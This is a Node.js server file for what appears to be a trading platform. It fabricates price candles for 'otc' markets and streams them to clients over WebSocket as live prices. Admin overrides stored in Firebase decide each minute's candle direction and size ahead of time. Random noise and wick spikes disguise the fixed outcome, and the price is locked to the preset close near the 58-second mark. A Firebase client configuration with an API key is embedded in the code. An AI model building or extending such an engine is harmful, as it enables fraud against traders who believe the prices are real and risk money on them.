// --- START: server.js (Smooth Pre-Calculated Target Engine) ---

const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const cors = require('cors');
const firebase = require('firebase/app');
require('firebase/database');

const firebaseConfig = {
    apiKey: "AIzaSyBUTMFblYIVovOe4F25XCFneJNTlVcoWCA",
    authDomain: "ictex-trade.firebaseapp.com",
    databaseURL: "https://ictex-trade-default-rtdb.firebaseio.com",
    projectId: "ictex-trade",
    storageBucket: "ictex-trade.appspot.com",
    messagingSenderId: "755532704199",
    appId: "1:755532704199:web:b27d7c9e7d0f4ac76291e2"
};

if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
const db = firebase.database();

const app = express();
app.use(cors());
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const MAX_CANDLES = 1000;
const TIMEFRAME = 60000;
const TICK_MS = 250; // Fast ticks for smoothness
const MIN_PRICE = 0.00001;
const HISTORY_SEED_COUNT = 300;

const markets = {}; 
const adminOverrides = {}; 

function roundPrice(v) { return parseFloat(Math.max(MIN_PRICE, v).toFixed(5)); }
function marketPathFromId(marketId) { return String(marketId || '').replace(/[\.\/ ]/g, '-').toLowerCase(); }

// Listen for Admin Commands
db.ref('admin/market_overrides').on('value', (snapshot) => {
    const data = snapshot.val() || {};
    Object.keys(data).forEach(marketId => {
        adminOverrides[marketId] = data[marketId];
    });
});

// 🔥 PRE-CALCULATE EXACT TARGET OHLC AT MINUTE START 🔥
function generateTargetCandle(timestamp, openPrice, cmd, prevCandle) {
    let isGreen = Math.random() > 0.5;
    let baseVol = openPrice * 0.00005;
    
    let prevBody = baseVol;
    if (prevCandle) {
        prevBody = Math.abs(prevCandle.close - prevCandle.open);
        if (prevBody < baseVol * 0.2) prevBody = baseVol; // Prevent tiny references
    }

    let body = baseVol * (0.8 + Math.random());
    let upWick = baseVol * Math.random();
    let dnWick = baseVol * Math.random();

    if (cmd) {
        const type = cmd.type;

        if (type.includes('UP')) isGreen = true;
        if (type.includes('DOWN')) isGreen = false;

        // User Custom Logics: Inside, Breakout, 2X
        if (type.includes('INSIDE')) {
            body = prevBody * (0.3 + Math.random() * 0.3); // 30-60% of previous candle
            upWick = baseVol * 0.2; dnWick = baseVol * 0.2;
        } else if (type.includes('BREAKOUT')) {
            body = prevBody * (1.2 + Math.random() * 0.4); // 120-160% of previous candle
            upWick = baseVol * 0.5; dnWick = baseVol * 0.5;
        } else if (type.includes('2X')) {
            body = prevBody * (2.0 + Math.random() * 0.8); // 200-280% of previous candle
            upWick = baseVol * 1.5; dnWick = baseVol * 1.5;
        } else if (type === 'OPPOSITE_BREAKOUT') {
            if (prevCandle) isGreen = prevCandle.close < prevCandle.open; // Flip color
            body = prevBody * (1.3 + Math.random() * 0.5); // Breakout size
        } else if (type === 'UP' || type === 'DOWN') {
            body = baseVol * (1.5 + Math.random());
        }
    }

    const close = isGreen ? openPrice + body : openPrice - body;
    const high = Math.max(openPrice, close) + upWick;
    const low = Math.min(openPrice, close) - dnWick;

    return { 
        timestamp, 
        open: roundPrice(openPrice), 
        close: roundPrice(close), 
        high: roundPrice(high), 
        low: roundPrice(low) 
    };
}

async function initializeNewMarket(marketId) {
    const path = marketPathFromId(marketId);
    let startPrice = 1.15;
    try {
        const liveSnap = await db.ref(`markets/${path}/live`).once('value');
        if (liveSnap.val()?.price) startPrice = liveSnap.val().price;
    } catch (e) {}

    const nowPeriod = Math.floor(Date.now() / TIMEFRAME) * TIMEFRAME;
    const candles = [];
    let currentPrice = startPrice;

    for (let i = HISTORY_SEED_COUNT; i > 0; i--) {
        const c = generateTargetCandle(nowPeriod - (i * TIMEFRAME), currentPrice, null, null);
        candles.push(c);
        currentPrice = c.close;
    }

    markets[marketId] = {
        marketId,
        marketPath: path,
        history: candles,
        currentPrice: currentPrice,
        targetCandle: null,
        currentNoise: 0
    };
}

// Ensure the target is set at 00 seconds
function ensureTargetCandle(marketData, currentPeriod) {
    let lastCandle = marketData.history[marketData.history.length - 1];
    
    if (!marketData.targetCandle || marketData.targetCandle.timestamp !== currentPeriod) {
        
        let overrideCmd = null;
        if (adminOverrides[marketData.marketId]) {
            const cmd = adminOverrides[marketData.marketId];
            // Check if command is meant for this minute
            if (currentPeriod >= cmd.targetTime && currentPeriod < cmd.targetTime + 60000) {
                overrideCmd = cmd;
                console.log(`[EXECUTE] Market: ${marketData.marketId}, Cmd: ${cmd.type}`);
            }
        }

        // Pre-calculate everything for the next 60 seconds
        const target = generateTargetCandle(currentPeriod, lastCandle.close, overrideCmd, lastCandle);
        marketData.targetCandle = target;
        marketData.currentNoise = 0; // Reset noise
        
        // Push the starting state of the new candle
        const newCandle = { timestamp: currentPeriod, open: target.open, high: target.open, low: target.open, close: target.open };
        marketData.history.push(newCandle);
        if (marketData.history.length > MAX_CANDLES) marketData.history.shift();
        
        marketData.currentPrice = target.open;
    }
}

// 🔥 TIME-BASED SMOOTH INTERPOLATION (NO LAST-SECOND JUMPS) 🔥
function updatePriceSmoothly(marketData, currentPeriod) {
    const target = marketData.targetCandle;
    if (!target) return;

    const liveCandle = marketData.history[marketData.history.length - 1];
    const timeElapsed = Date.now() - currentPeriod;
    const progress = Math.min(timeElapsed / 60000, 1.0); // 0.0 to 1.0

    // Linear path from open to close based exactly on time
    const expectedBasePath = target.open + ((target.close - target.open) * progress);
    
    // Add random noise (ticks) that shrinks to 0 as time runs out
    const noiseMaxAllowed = (target.open * 0.00015) * (1 - progress); 
    let tickDelta = (Math.random() - 0.5) * noiseMaxAllowed * 0.3;
    
    marketData.currentNoise += tickDelta;

    // Constrain noise
    if (Math.abs(marketData.currentNoise) > noiseMaxAllowed) {
        marketData.currentNoise *= 0.5;
    }

    // Randomly spike to draw the high/low wicks during mid-minute
    if (progress > 0.1 && progress < 0.8 && Math.random() < 0.05) {
        if (Math.random() > 0.5) {
            marketData.currentNoise = (target.high - expectedBasePath) * Math.random();
        } else {
            marketData.currentNoise = (target.low - expectedBasePath) * Math.random();
        }
    }

    let newPrice = expectedBasePath + marketData.currentNoise;

    // 🛡️ HARD LOCK AT 58 SECONDS (Glides perfectly, no jumps)
    if (progress >= 0.97) {
        newPrice = target.close;
    }

    marketData.currentPrice = newPrice;

    // Update live candle
    liveCandle.close = roundPrice(newPrice);
    liveCandle.high = roundPrice(Math.max(liveCandle.high, liveCandle.close, target.open));
    liveCandle.low = roundPrice(Math.min(liveCandle.low, liveCandle.close, target.open));
}

function broadcastCandle(marketId, candle) {
    const payload = JSON.stringify({ market: marketId, candle, serverTime: Date.now() });
    wss.clients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN && client.subscribedMarket === marketId) {
            client.send(payload);
        }
    });
}

db.ref('admin/markets').on('value', (snapshot) => {
    const fbMarkets = snapshot.val() || {};
    Object.keys(fbMarkets).forEach((marketId) => {
        const type = fbMarkets[marketId]?.type;
        if ((type === 'otc' || type === 'broker_real') && !markets[marketId]) {
            initializeNewMarket(marketId);
        }
    });
});

wss.on('connection', (ws) => {
    ws.on('message', (raw) => {
        try {
            const msg = JSON.parse(raw.toString());
            if (msg?.type === 'subscribe') {
                ws.subscribedMarket = msg.market;
                if (markets[msg.market]) {
                    const historyPayload = { type: 'history', market: msg.market, candles: markets[msg.market].history.slice(-300) };
                    ws.send(JSON.stringify(historyPayload));
                }
            }
        } catch (_) {}
    });
});

let lastSyncMinute = 0;
setInterval(() => {
    const now = Date.now();
    const currentPeriod = Math.floor(now / TIMEFRAME) * TIMEFRAME;
    const currentMinute = Math.floor(now / 60000);

    for (const marketId in markets) {
        const marketData = markets[marketId];
        ensureTargetCandle(marketData, currentPeriod);
        updatePriceSmoothly(marketData, currentPeriod);
        broadcastCandle(marketId, marketData.history[marketData.history.length - 1]);
    }

    // Save to Firebase
    if (currentMinute > lastSyncMinute) {
        lastSyncMinute = currentMinute;
        const batchUpdates = {};
        for (const marketId in markets) {
            const m = markets[marketId];
            const lastC = m.history[m.history.length-1];
            if (lastC) {
                batchUpdates[`markets/${m.marketPath}/live`] = { price: lastC.close, timestamp: lastC.timestamp };
            }
        }
        db.ref().update(batchUpdates).catch(()=>{});
    }
}, TICK_MS);

app.get('/ping', (_req, res) => res.send('Smooth Pre-Calculated Engine V3 Running'));
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on ${PORT}`));